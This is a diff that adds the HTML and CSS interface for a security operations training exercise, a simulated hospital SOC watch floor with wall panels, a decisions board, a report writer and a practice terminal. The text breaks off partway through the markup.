@@ -1,0 +1,1835 @@
+<title>Ridgeline Watch Floor</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500&family=Source+Sans+3:ital,wght@0,400;0,600;1,400&display=swap">
+
+<style>
+/* A room at 08:15 with the lights down and the wall up. Deliberately one
+   visual world -- a watch floor is not a thing that has a light mode -- so
+   every colour is painted explicitly rather than inherited from the host. */
+:root {
+  --room:      #0A0F13;
+  --room-far:  #101922;
+  --carpet:    #14181C;
+  --carpet-2:  #191E23;
+  --desk:      #C9C2B4;
+  --desk-edge: #9C9585;
+  --desk-side: #8A8474;
+  --panel:     #121A20;
+  --panel-2:   #18232B;
+  --line:      #24333D;
+  --ink:       #E4EDF0;
+  --muted:     #8299A3;
+  --accent:    #F0A63C;
+  --accent-dk: #1B1204;
+  --crit:      #E5615C;
+  --ok:        #46C38A;
+  --screen:    #0E2A3D;
+  --screen-lit:#7FD3EE;
+}
+* { box-sizing: border-box; }
+body {
+  margin: 0; background: var(--room); color: var(--ink);
+  font: 400 16px/1.55 "Source Sans 3", ui-sans-serif, system-ui, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+.wrap { max-width: 1400px; margin: 0 auto; padding: 24px 20px 60px; }
+
+.top { display: flex; flex-wrap: wrap; align-items: flex-end; gap: 16px 28px;
+  padding-bottom: 14px; border-bottom: 1px solid var(--line); }
+.brand { flex: 1 1 280px; }
+.eyebrow { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .8rem; letter-spacing: .2em; text-transform: uppercase;
+  color: var(--muted); margin: 0 0 2px; }
+h1 { font-family: "Barlow Condensed", sans-serif; font-weight: 700;
+  font-size: clamp(1.9rem, 4vw, 2.7rem); line-height: 1; margin: 0;
+  text-wrap: balance; }
+.readout { display: flex; gap: 24px; flex-wrap: wrap; }
+.stat { display: flex; flex-direction: column; }
+.stat b { font-family: "IBM Plex Mono", monospace; font-weight: 500;
+  font-size: 1.15rem; font-variant-numeric: tabular-nums; }
+.stat span { font-family: "Barlow Condensed", sans-serif; font-size: .74rem;
+  letter-spacing: .15em; text-transform: uppercase; color: var(--muted); }
+.note { margin: 12px 0 0; color: var(--muted); max-width: 70ch; font-size: .95rem; }
+.note em { color: var(--ink); font-style: normal; font-weight: 600; }
+
+/* Floor and rail, with a grip between them. The floor is the thing people
+   actually watch, so it gets to grow: the decisions list is legible at a much
+   narrower width than the room is. */
+.stage {
+  display: grid;
+  grid-template-columns: minmax(320px, var(--floor, 62%)) 10px minmax(240px, 1fr);
+  gap: 0; margin-top: 20px;
+}
+.grip {
+  position: relative; cursor: col-resize; background: none; border: 0; padding: 0;
+  display: flex; align-items: center; justify-content: center;
+}
+.grip::before {
+  content: ""; width: 2px; height: 100%; background: var(--line);
+  transition: background .12s;
+}
+.grip:hover::before, .grip:focus-visible::before { background: var(--accent); }
+.grip:focus-visible { outline: none; }
+.grip::after {
+  content: ""; position: absolute; width: 4px; height: 34px; border-radius: 2px;
+  background: var(--line); transition: background .12s;
+}
+.grip:hover::after, .grip:focus-visible::after { background: var(--accent); }
+/* The panels need their own gutter now that the grid gap is gone. */
+.stage > .panel { margin-right: 10px; }
+.stage > .rail { margin-left: 10px; }
+
+@media (max-width: 1000px) {
+  .stage { grid-template-columns: 1fr; gap: 20px; }
+  .grip { display: none; }
+  .stage > .panel, .stage > .rail { margin: 0; }
+}
+
+.panel { background: var(--panel); border: 1px solid var(--line); border-radius: 4px; }
+.panel-head { display: flex; align-items: baseline; justify-content: space-between;
+  gap: 12px; padding: 10px 14px; border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+.panel-head h2 { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .9rem; letter-spacing: .16em; text-transform: uppercase;
+  margin: 0; color: var(--muted); }
+.scale { font-family: "IBM Plex Mono", monospace; font-size: .71rem; color: var(--muted); }
+
+/* ── the room ─────────────────────────────────────────── */
+.scene { position: relative; aspect-ratio: 1200 / 760; overflow: hidden;
+  background: var(--room); }
+.scene svg.room { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
+
+/* seat hotspots sit on top of the drawing, anchored to the same coordinates */
+.seat { position: absolute; transform: translate(-50%, -100%);
+  background: none; border: 0; padding: 0; cursor: pointer; font: inherit;
+  color: inherit; display: flex; flex-direction: column; align-items: center; gap: 3px; }
+.seat:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 3px; }
+.plate { display: flex; flex-direction: column; align-items: center;
+  background: rgba(8,14,18,.82); border: 1px solid var(--line);
+  border-radius: 3px; padding: 3px 8px 4px; backdrop-filter: blur(2px);
+  transition: border-color .12s, background .12s; white-space: nowrap; }
+.plate b { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .7rem; letter-spacing: .1em; text-transform: uppercase;
+  color: var(--ink); line-height: 1.15; }
+.plate span { font-family: "IBM Plex Mono", monospace; font-size: .6rem;
+  color: var(--muted); line-height: 1.1; }
+.seat:hover .plate { border-color: var(--accent); }
+.seat[aria-pressed="true"] .plate { border-color: var(--accent); background: rgba(240,166,60,.16); }
+.seat[aria-pressed="true"] .plate b { color: var(--accent); }
+.seat.vacant .plate { border-style: dashed; }
+.seat.vacant .plate b { color: var(--muted); }
+.stem { width: 1px; height: 12px; background: var(--line); }
+/* Your own chair. Persistent, not a selection state, so it survives clicking
+   about: the one thing on the floor that never stops being true. */
+.seat.you .plate {
+  border-color: var(--accent); border-width: 2px;
+  box-shadow: 0 0 0 3px rgba(240,166,60,.18);
+}
+.seat.you .stem { background: var(--accent); }
+.youtag {
+  display: block; margin-top: 1px;
+  font-family: "Barlow Condensed", sans-serif; font-weight: 700;
+  font-size: .58rem; letter-spacing: .18em; text-transform: uppercase;
+  color: var(--accent-dk); background: var(--accent);
+  border-radius: 2px; padding: 0 4px;
+}
+.seat[aria-pressed="true"] .stem, .seat.speaking .stem { background: var(--accent); }
+.seat.speaking .plate { border-color: var(--accent);
+  background: rgba(240,166,60,.2); box-shadow: 0 0 16px rgba(240,166,60,.35); }
+.seat.speaking .plate b { color: var(--accent); }
+
+/* ── the video wall ───────────────────────────────────────
+   Four panels, not thirty tiles. Positioned over the SVG wall frame at
+   148,44 904x214 in a 1200x760 viewBox, so the two stay registered. */
+.wall {
+  position: absolute; left: 12.33%; top: 5.79%; width: 75.33%; height: 28.16%;
+  display: grid; gap: 4px; padding: 5px;
+  grid-template-columns: 1.15fr .95fr .95fr .8fr .72fr;
+  font-family: "IBM Plex Mono", monospace;
+}
+.wpanel {
+  background: #06121A; border: 1px solid #172A36; border-radius: 2px;
+  display: flex; flex-direction: column; overflow: hidden; min-width: 0;
+}
+.wpanel header {
+  display: flex; justify-content: space-between; align-items: center; gap: 6px;
+  padding: 3px 6px; border-bottom: 1px solid #14242E; background: #081A24;
+  font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: clamp(7px, .85vw, 11px); letter-spacing: .1em; text-transform: uppercase;
+  color: #6FA8BE; white-space: nowrap;
+}
+.wpanel header b { color: var(--ok); font-weight: 600; }
+.wpanel header b.bad { color: var(--crit); }
+.wpanel .lines {
+  flex: 1; overflow: hidden; padding: 3px 5px;
+  display: flex; flex-direction: column; justify-content: flex-end;
+  font-size: clamp(5.5px, .62vw, 8px); line-height: 1.45; color: #63C4E4;
+}
+.wpanel .lines div { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.wpanel .lines div.l-hot { color: var(--crit); }
+.wpanel .lines div.l-warn { color: var(--accent); }
+.hosts, .flows { list-style: none; margin: 0; padding: 4px 6px; flex: 1;
+  display: flex; flex-direction: column; gap: 3px; justify-content: center;
+  font-size: clamp(5.5px, .64vw, 8.5px); }
+.hosts li, .flows li { display: flex; justify-content: space-between; gap: 6px;
+  color: #8FB6C6; white-space: nowrap; }
+.hosts li b, .flows li b { font-weight: 500; }
+.hosts li b.up { color: var(--ok); } .hosts li b.down { color: var(--crit); }
+.hosts li b.warnst { color: var(--accent); }
+.flows li.flag { color: var(--crit); }
+.wpanel.shift { align-items: stretch; }
+.wpanel.shift .big { font-size: clamp(14px, 2vw, 26px); color: #BFE6F4;
+  text-align: center; padding: 4px 0 2px; font-variant-numeric: tabular-nums; }
+.metre { display: flex; justify-content: space-between; padding: 0 6px;
+  font-size: clamp(5.5px, .64vw, 8.5px); color: #8FB6C6; }
+.metre b { color: #DDF1F8; font-weight: 500; }
+.bar { margin: 4px 6px 3px; height: 3px; background: #12242E; border-radius: 2px; overflow: hidden; }
+.bar i { display: block; height: 100%; width: 0; background: var(--ok); transition: width .4s, background .4s; }
+.wpanel.shift .hint { margin: 0; padding: 0 6px 4px; color: #5C7F8E;
+  font-size: clamp(5px, .58vw, 7.5px); line-height: 1.3; }
+
+/* Caption over the room. Without it, running the sync changed only a nameplate
+   glow the reader was usually scrolled away from -- it looked like nothing had
+   happened at all. */
+.now {
+  position: absolute; left: 0; right: 0; bottom: 0;
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  padding: 9px 14px; background: linear-gradient(to top, rgba(6,10,13,.94), rgba(6,10,13,0));
+  opacity: 0; transition: opacity .18s; pointer-events: none;
+}
+.now.on { opacity: 1; }
+.now .tag { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .72rem; letter-spacing: .14em; text-transform: uppercase;
+  color: var(--accent-dk); background: var(--accent); padding: 2px 7px; border-radius: 2px; }
+.now .said { font-size: .93rem; color: var(--ink); flex: 1 1 240px; min-width: 0; }
+
+.legend { display: flex; gap: 16px; flex-wrap: wrap; padding: 10px 14px;
+  border-top: 1px solid var(--line); color: var(--muted); font-size: .8rem; }
+.legend i { width: 10px; height: 10px; border: 1px solid var(--line);
+  display: inline-block; margin-right: 6px; vertical-align: -1px; border-radius: 2px; }
+
+/* ── detail rail ──────────────────────────────────────── */
+.rail { display: flex; flex-direction: column; gap: 20px; }
+.detail-body { padding: 15px 16px 19px; }
+.role-title { font-family: "Barlow Condensed", sans-serif; font-weight: 700;
+  font-size: 1.5rem; line-height: 1.05; margin: 0 0 2px; text-wrap: balance; }
+.role-handle { font-family: "IBM Plex Mono", monospace; font-size: .82rem;
+  color: var(--accent); margin: 0 0 12px; }
+.oneline { margin: 0 0 14px; font-size: 1rem; }
+.chips { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
+.chip { font-family: "Barlow Condensed", sans-serif; font-size: .71rem;
+  font-weight: 600; letter-spacing: .1em; text-transform: uppercase;
+  padding: 3px 8px; border: 1px solid var(--line); border-radius: 2px; color: var(--muted); }
+.chip.live { color: var(--ok); border-color: #235c45; }
+.chip.new { color: var(--accent); border-color: #6b4a17; }
+.sub { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .77rem; letter-spacing: .16em; text-transform: uppercase;
+  color: var(--muted); margin: 16px 0 6px; }
+.detail-body p { margin: 0 0 9px; }
+.sees { margin: 0; padding: 0; list-style: none; display: flex;
+  flex-direction: column; gap: 6px; }
+.sees li { position: relative; padding-left: 16px; font-size: .94rem; }
+.sees li::before { content: ""; position: absolute; left: 0; top: .55em;
+  width: 7px; height: 1px; background: var(--accent); }
+.warn { border-left: 2px solid var(--crit); padding: 7px 0 7px 11px;
+  color: var(--muted); font-size: .93rem; }
+.warn b { color: var(--ink); font-weight: 600; }
+.empty-state { padding: 32px 20px; color: var(--muted); text-align: center; }
+
+/* ── sync ─────────────────────────────────────────────── */
+button.run { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .8rem; letter-spacing: .12em; text-transform: uppercase;
+  background: var(--accent); color: var(--accent-dk); border: 0;
+  border-radius: 2px; padding: 7px 13px; cursor: pointer; }
+button.run.ghost { background: transparent; color: var(--muted); border: 1px solid var(--line); }
+button.run:focus-visible { outline: 2px solid var(--ink); outline-offset: 2px; }
+.beat { display: grid; grid-template-columns: 50px 1fr; gap: 0 11px;
+  padding: 11px 14px; border: 0; border-bottom: 1px solid var(--line);
+  width: 100%; text-align: left; font: inherit; color: inherit;
+  background: none; cursor: pointer; }
+.beat:last-child { border-bottom: 0; }
+.beat:hover, .beat:focus-visible { background: var(--panel-2); outline: none; }
+.beat.active { background: var(--panel-2); box-shadow: inset 3px 0 0 var(--accent); }
+.beat .clock { font-family: "IBM Plex Mono", monospace; font-size: .74rem;
+  color: var(--muted); font-variant-numeric: tabular-nums; padding-top: 2px; }
+.beat .who { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .73rem; letter-spacing: .13em; text-transform: uppercase;
+  color: var(--accent); margin-bottom: 3px; display: block; }
+.beat .says { margin: 0; font-size: .95rem; }
+.beat .dir { display: block; margin-top: 4px; color: var(--muted);
+  font-size: .87rem; font-style: italic; }
+/* A wall panel is a way in, not a picture. Clicking one drops the seat into
+   the terminal at the file behind it, which is the same virtual filesystem the
+   exercises already run against. */
+.wpanel { cursor: pointer; }
+.wpanel:hover { border-color: #2E6E86; }
+.wpanel:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }
+.wpanel .open-hint {
+  position: absolute; inset: auto 0 0 0; padding: 2px 5px; text-align: right;
+  font-family: "Barlow Condensed", sans-serif; font-size: clamp(6px, .62vw, 8px);
+  letter-spacing: .1em; text-transform: uppercase; color: var(--accent);
+  background: linear-gradient(to top, rgba(6,18,26,.95), transparent);
+  opacity: 0; transition: opacity .12s; pointer-events: none;
+}
+.wpanel { position: relative; }
+.wpanel:hover .open-hint, .wpanel:focus-visible .open-hint { opacity: 1; }
+
+/* the decisions board */
+.decisions { list-style: none; margin: 0; padding: 0; }
+.decisions li {
+  display: grid; grid-template-columns: 62px 1fr auto; gap: 2px 10px;
+  padding: 9px 14px; border-bottom: 1px solid var(--line); align-items: baseline;
+}
+.decisions li:last-child { border-bottom: 0; }
+.decisions li.split { background: rgba(240,166,60,.07); box-shadow: inset 3px 0 0 var(--accent); }
+.dec-ev {
+  font-family: "IBM Plex Mono", monospace; font-size: .72rem; color: var(--muted);
+}
+.dec-who {
+  font-family: "Barlow Condensed", sans-serif; font-weight: 600; font-size: .82rem;
+  letter-spacing: .06em; text-transform: uppercase; color: var(--ink);
+}
+.dec-who span { display: block; font-family: "IBM Plex Mono", monospace;
+  font-size: .64rem; letter-spacing: 0; text-transform: none; color: var(--muted); }
+.dec-call {
+  font-family: "Barlow Condensed", sans-serif; font-weight: 600; font-size: .74rem;
+  letter-spacing: .1em; text-transform: uppercase; padding: 2px 7px;
+  border: 1px solid var(--line); border-radius: 2px; white-space: nowrap;
+}
+.dec-call.escalate { color: var(--crit); border-color: #6b2f2d; }
+.dec-call.investigate { color: var(--accent); border-color: #6b4a17; }
+.dec-call.dismiss { color: var(--muted); }
+.dec-call.tune { color: #7FC6DC; border-color: #24515f; }
+.dec-note {
+  grid-column: 2 / -1; color: var(--muted); font-size: .84rem; margin: 0;
+}
+.dec-foot {
+  margin: 0; padding: 10px 14px; border-top: 1px solid var(--line);
+  color: var(--muted); font-size: .85rem;
+}
+.dec-foot b { color: var(--accent); font-weight: 600; }
+
+/* push to talk */
+.mic {
+  position: absolute; left: 12px; bottom: 12px; z-index: 5;
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  max-width: 60%;
+}
+.mic-btn {
+  display: inline-flex; align-items: center; gap: 7px;
+  background: rgba(8,14,18,.9); border: 1px solid var(--line);
+  border-radius: 999px; padding: 6px 14px 6px 11px; cursor: pointer;
+  font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .8rem; letter-spacing: .1em; text-transform: uppercase;
+  color: var(--muted); transition: border-color .12s, color .12s, background .12s;
+}
+.mic-btn:hover { border-color: var(--accent); color: var(--ink); }
+.mic-btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+.mic-dot {
+  width: 9px; height: 9px; border-radius: 50%;
+  background: #3A4A54; transition: background .12s, box-shadow .12s;
+}
+.mic-btn[aria-pressed="true"] {
+  border-color: var(--accent); color: var(--accent);
+  background: rgba(240,166,60,.16);
+}
+.mic-btn[aria-pressed="true"] .mic-dot {
+  background: var(--crit); box-shadow: 0 0 0 4px rgba(229,97,92,.25);
+  animation: livepulse 1.4s ease-in-out infinite;
+}
+@keyframes livepulse { 50% { box-shadow: 0 0 0 7px rgba(229,97,92,.08); } }
+.mic-note, .mic-who {
+  font-family: "IBM Plex Mono", monospace; font-size: .64rem; color: var(--muted);
+}
+.mic-who { color: var(--accent); }
+@media (prefers-reduced-motion: reduce) { .mic-btn[aria-pressed="true"] .mic-dot { animation: none; } }
+
+/* the fifth panel: who has filed */
+.filed { list-style: none; margin: 0; padding: 4px 6px; flex: 1;
+  display: flex; flex-direction: column; gap: 2px; justify-content: center;
+  font-size: clamp(5.5px, .6vw, 8px); }
+.filed li { display: flex; justify-content: space-between; gap: 6px;
+  color: #8FB6C6; white-space: nowrap; cursor: pointer; }
+.filed li:hover { color: var(--accent); }
+.filed li b { font-weight: 500; color: var(--ok); }
+.filed li.pending b { color: #4A6472; }
+.filed li.presenting { color: var(--accent); }
+
+/* presenting takes the wall */
+.present {
+  position: absolute; left: 12.33%; top: 5.79%; width: 75.33%; height: 28.16%;
+  z-index: 4; background: #06121A; border: 1px solid var(--accent);
+  border-radius: 2px; display: flex; flex-direction: column; overflow: hidden;
+  box-shadow: 0 0 40px -6px rgba(240,166,60,.35);
+}
+.present[hidden] { display: none; }
+.present-head {
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  padding: 4px 8px; border-bottom: 1px solid #14242E; background: #0A1F2B;
+}
+.present-head b { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: clamp(8px, .9vw, 12px); letter-spacing: .1em; text-transform: uppercase;
+  color: var(--accent); }
+.present-head span { font-family: "IBM Plex Mono", monospace;
+  font-size: clamp(6px, .68vw, 9px); color: var(--muted); }
+.present-head button { margin-left: auto; padding: 2px 8px; font-size: clamp(6px, .65vw, 9px); }
+.present-body {
+  flex: 1; overflow: auto; padding: 6px 10px;
+  display: grid; grid-template-columns: 1fr 1fr; gap: 4px 14px; align-content: start;
+}
+.present-body h4 {
+  margin: 0 0 1px; font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: clamp(6px, .7vw, 9px); letter-spacing: .1em; text-transform: uppercase;
+  color: #6FA8BE;
+}
+.present-body p { margin: 0 0 5px; font-size: clamp(6px, .68vw, 9px);
+  line-height: 1.45; color: #C6DDE7; }
+.present-body .limits { grid-column: 1 / -1; border-top: 1px solid #14242E; padding-top: 4px; }
+.present-body .limits h4 { color: var(--accent); }
+
+/* the report writer */
+.writer {
+  position: absolute; inset: 0; z-index: 7; background: rgba(5,9,12,.97);
+  display: flex; flex-direction: column;
+}
+.writer[hidden] { display: none; }
+.writer-head {
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  padding: 9px 13px; border-bottom: 1px solid var(--line);
+}
+.writer-head b { font-family: "Barlow Condensed", sans-serif; font-weight: 700;
+  font-size: 1rem; letter-spacing: .04em; color: var(--ink); }
+.writer-head span { color: var(--muted); font-size: .84rem; flex: 1 1 200px; }
+.writer-body { flex: 1; overflow: auto; padding: 12px 14px; }
+.wsec { margin-bottom: 14px; }
+.wsec h4 { margin: 0 0 2px; font-family: "Barlow Condensed", sans-serif;
+  font-weight: 600; font-size: .84rem; letter-spacing: .1em;
+  text-transform: uppercase; color: var(--ink); }
+.wsec p.hint { margin: 0 0 5px; color: var(--muted); font-size: .86rem; }
+.wsec textarea {
+  width: 100%; min-height: 62px; resize: vertical; background: var(--panel-2);
+  border: 1px solid var(--line); border-radius: 3px; padding: 7px 9px;
+  color: var(--ink); font: inherit; font-size: .9rem; line-height: 1.5;
+}
+.wsec textarea:focus { outline: none; border-color: var(--accent); }
+.wsec .count { display: block; text-align: right; margin-top: 2px;
+  font-family: "IBM Plex Mono", monospace; font-size: .68rem; color: var(--muted); }
+.wsec .count.short { color: var(--crit); }
+.wsec .count.ok { color: var(--ok); }
+.wsec.limits h4 { color: var(--accent); }
+
+/* seat detail, over the floor rather than beside it */
+.seatcard {
+  position: absolute; inset: 0; z-index: 6;
+  background: rgba(5,9,12,.72); backdrop-filter: blur(3px);
+  display: flex; align-items: center; justify-content: center; padding: 4%;
+}
+.seatcard[hidden] { display: none; }
+.seatcard-inner {
+  position: relative; max-width: 560px; width: 100%; max-height: 100%;
+  overflow: auto; background: var(--panel); border: 1px solid var(--line);
+  border-radius: 4px; box-shadow: 0 24px 60px -12px rgba(0,0,0,.7);
+}
+.seatcard-close {
+  position: absolute; top: 10px; right: 10px; z-index: 1;
+  font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .74rem; letter-spacing: .12em; text-transform: uppercase;
+  background: var(--panel-2); color: var(--muted);
+  border: 1px solid var(--line); border-radius: 2px;
+  padding: 4px 10px; cursor: pointer;
+}
+.seatcard-close:hover { color: var(--ink); border-color: var(--accent); }
+.seatcard-close:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+/* the terminal the wall opens into */
+.drill {
+  position: absolute; inset: 0; background: rgba(5,9,12,.97);
+  display: flex; flex-direction: column; z-index: 5;
+}
+.drill[hidden] { display: none; }
+.drill-head {
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  padding: 9px 13px; border-bottom: 1px solid var(--line); flex-wrap: wrap;
+}
+.drill-head b { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .84rem; letter-spacing: .12em; text-transform: uppercase; color: var(--accent); }
+.drill-head span { font-family: "IBM Plex Mono", monospace; font-size: .74rem; color: var(--muted); }
+.drill-body {
+  flex: 1; overflow: auto; padding: 10px 13px;
+  font-family: "IBM Plex Mono", monospace; font-size: .74rem; line-height: 1.6;
+  color: #9FD8EC;
+}
+.drill-body .cmd { color: var(--ink); }
+.drill-body .cmd b { color: var(--ok); font-weight: 400; }
+.drill-body .hot { color: var(--crit); }
+.drill-body .dim { color: var(--muted); }
+.drill-input {
+  display: flex; align-items: baseline; gap: 8px;
+  padding: 6px 13px 10px; border-top: 1px solid var(--line);
+  font-family: "IBM Plex Mono", monospace; font-size: .74rem;
+}
+.drill-input label { color: var(--ok); white-space: nowrap; }
+.drill-input input {
+  flex: 1; min-width: 0; background: none; border: 0; outline: none;
+  color: var(--ink); font: inherit; caret-color: var(--accent);
+}
+.drill-foot {
+  border-top: 1px solid var(--line); padding: 8px 13px;
+  font-size: .84rem; color: var(--muted);
+}
+.drill-foot b { color: var(--ink); font-weight: 600; }
+
+/* the gate the lead has to pass before the script exists */
+.gate { padding: 14px; }
+.gate-q { margin: 0 0 12px; font-size: 1rem; color: var(--ink); }
+.gate-opts { display: flex; flex-direction: column; gap: 7px; }
+.gate-opt { display: flex; flex-direction: column; gap: 2px; text-align: left;
+  background: var(--panel-2); border: 1px solid var(--line); border-radius: 3px;
+  padding: 9px 11px; cursor: pointer; font: inherit; color: inherit; }
+.gate-opt:hover, .gate-opt:focus-visible { border-color: var(--accent); outline: none; }
+.gate-opt b { font-family: "Barlow Condensed", sans-serif; font-weight: 600;
+  font-size: .95rem; letter-spacing: .02em; }
+.gate-opt span { color: var(--muted); font-size: .87rem; }
+.gate-wait { margin: 0 0 12px; color: var(--muted); font-size: .9rem; }
+.gate-note { margin: 12px 0 0; padding-left: 11px; border-left: 2px solid var(--accent);
+  color: var(--muted); font-size: .91rem; }
+.gate-note b { color: var(--ink); font-weight: 600; }
+
+.footnote { margin: 24px 0 0; color: var(--muted); font-size: .88rem; max-width: 76ch; }
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } }
+</style>
+
+<div class="wrap">
+  <header class="top">
+    <div class="brand">
+      <p class="eyebrow">Ridgeline Medical Group &middot; Security Operations</p>
+      <h1>The Watch Floor</h1>
+    </div>
+    <div class="readout">
+      <div class="stat"><b>08:15</b><span>Shift start</span></div>
+      <div class="stat"><b id="occ">13/14</b><span>Seats filled</span></div>
+      <div class="stat"><b style="color:var(--crit)">INC-0815</b><span>Active</span></div>
+      <div class="stat" id="whoami"><b style="color:var(--accent)">&mdash;</b><span>Your seat</span></div>
+    </div>
+  </header>
+
+  <div class="stage">
+    <section class="panel">
+      <div class="panel-head">
+        <h2>Watch floor &middot; Level 2 West</h2>
+        <span class="scale">14 seats &middot; 3 rows &middot; command pod</span>
+      </div>
+      <div class="scene" id="scene">
+        <svg class="room" id="room" viewBox="0 0 1200 760" preserveAspectRatio="xMidYMid meet" aria-label="View of the security operations floor"></svg>
+        <div class="wall" id="wall">
+          <section class="wpanel tail" data-drill="tail">
+            <header>auth.log / rmg-web-02 <b id="w-rate">live</b></header>
+            <div class="lines" id="w-log"></div>
+          </section>
+          <section class="wpanel" data-drill="hosts">
+            <header>Service status <b id="w-degraded">1 degraded</b></header>
+            <ul class="hosts" id="w-hosts"></ul>
+          </section>
+          <section class="wpanel" data-drill="flows">
+            <header>Egress watch <b class="bad">2 flagged</b></header>
+            <ul class="flows" id="w-flows"></ul>
+          </section>
+          <section class="wpanel" data-drill="reports">
+            <header>Reports <b id="w-filed">3/8</b></header>
+            <ul class="filed" id="w-reports"></ul>
+          </section>
+          <section class="wpanel shift" data-drill="shift">
+            <header>Shift</header>
+            <div class="big" id="w-clock">00:00</div>
+            <div class="metre"><span>Queue</span><b id="w-queue">12</b></div>
+            <div class="metre"><span>Cleared</span><b id="w-cleared">0</b></div>
+            <div class="bar"><i id="w-bar"></i></div>
+            <p class="hint" id="w-hint">60 minutes on the clock.</p>
+          </section>
+        </div>
+        <!--
+          Push to talk. Silence is the default state, deliberately: a hot mic
+          in a room of strangers is how people stop saying the uncertain thing
+          out loud, and the uncertain thing is usually the useful one.
+        -->
+        <div class="mic" id="mic">
+          <button class="mic-btn" id="mic-btn" aria-pressed="false"
+                  aria-label="Microphone. Off. Space toggles.">
+            <span class="mic-dot"></span><span id="mic-label">Mic off</span>
+          </button>
+          <span class="mic-note">Not recorded. Nothing here is saved or graded.</span>
+          <span class="mic-who" id="mic-who"></span>
+        </div>
+        <div class="now" id="now" aria-live="polite"><span class="tag" id="now-who"></span><span class="said" id="now-said"></span></div>
+        <!--
+          Seat detail is a popup, not a panel. What a role does is reference
+          material read once; the screen belongs to the triage work.
+        -->
+        <div class="seatcard" id="seatcard" hidden role="dialog" aria-label="Seat detail">
+          <div class="seatcard-inner">
+            <button class="seatcard-close" id="seatcard-close" aria-label="Close">Close</button>
+            <div id="detail"></div>
+          </div>
+        </div>
+        <!--
+          Presenting takes the wall, the way somebody throwing their screen up
+          takes it in a real room. The floor reads along while they talk, which
+          is the point: a report read aloud that nobody can see is a monologue.
+        -->
+        <div class="present" id="present" hidden>
+          <div class="present-head">
+            <b id="present-who"></b>
+            <span id="present-doc"></span>
+            <button class="run ghost" id="present-close">Back to the wall</button>
+          </div>
+          <div class="present-body" id="present-body"></div>
+        </div>
+        <!--
+          The report writer. Sections come from that seat's own template, so a
+          forensics record and an intel assessment are different documents
+          rather than one box labelled findings.
+        -->
+        <div class="writer" id="writer" hidden>
+          <div class="writer-head">
+            <b id="writer-title"></b>
+            <span id="writer-aud"></span>
+            <button class="run ghost" id="writer-close">Close</button>
+            <button class="run" id="writer-file">File it</button>
+          </div>
+          <div class="writer-body" id="writer-body"></div>
+        </div>
+        <div class="drill" id="drill" hidden>
+          <div class="drill-head">
+            <b id="drill-title"></b>
+            <span id="drill-path"></span>
+            <button class="run ghost" id="drill-close">Back to the floor</button>
+          </div>
+          <div class="drill-body" id="drill-body"></div>
+          <form class="drill-input" id="drill-form" autocomplete="off">
+            <label for="drill-cmd" id="drill-prompt">student@rmg-web-02:/var/log$</label>
+            <input id="drill-cmd" name="cmd" spellcheck="false" aria-label="Command">
+          </form>
+          <p class="drill-foot" id="drill-foot"></p>
+        </div>
+      </div>
+      <div class="legend">
+        <span><i style="background:rgba(240,166,60,.16);border-color:var(--accent)"></i>Selected</span>
+        <span><i style="border-style:dashed"></i>Unassigned</span>
+        <span><i style="background:rgba(240,166,60,.2);border-color:var(--accent)"></i>Speaking now</span>
+      </div>
+    </section>
+
+    <button class="grip" id="grip" role="separator" aria-orientation="vertical"
+            aria-label="Resize the floor. Arrow keys adjust, double click resets."
+            aria-valuenow="62" aria-valuemin="35" aria-valuemax="80"></button>
+
+    <div class="rail">
+      <!--
+        Decisions, not role descriptions. The lead cannot pace a floor they
+        cannot see, and two operators dispositioning the same alert differently
+        is the case worth surfacing: that is the one they have to adjudicate.
+      -->
+      <section class="panel">
+        <div class="panel-head">
+          <h2>Decisions</h2>
+          <span style="display:flex;gap:8px;align-items:center">
+            <span class="scale" id="dec-count"></span>
+            <button class="run" id="write-report">Write my report</button>
+          </span>
+        </div>
+        <ul class="decisions" id="decisions"></ul>
+        <p class="dec-foot" id="dec-foot"></p>
+      </section>
+      <section class="panel">
+        <div class="panel-head">
+          <h2 id="sync-title">The lead's call</h2>
+          <span style="display:flex;gap:8px" id="sync-controls" hidden>
+            <button class="run" id="run">Call the floor together</button>
+            <button class="run ghost" id="reset">Reset</button>
+          </span>
+        </div>
+
+        <!--
+          The script is EARNED, not issued. A lead handed a script before
+          deciding has been told there is something to decide, and a script
+          written in advance leaks the findings the floor is supposed to make.
+          So: call it first, then get a pacing aid that names who to ask and
+          never what they will say.
+        -->
+        <div id="gate" class="gate">
+          <!--
+            Nothing is offered at the start. Presenting the options is itself a
+            prompt that there is something to decide, which is the judgement the
+            lead is supposed to be exercising. So the panel stays quiet, the
+            board fills, and the lead decides when to act on their own read.
+          -->
+          <p class="gate-q" id="gate-q">Watching the board.</p>
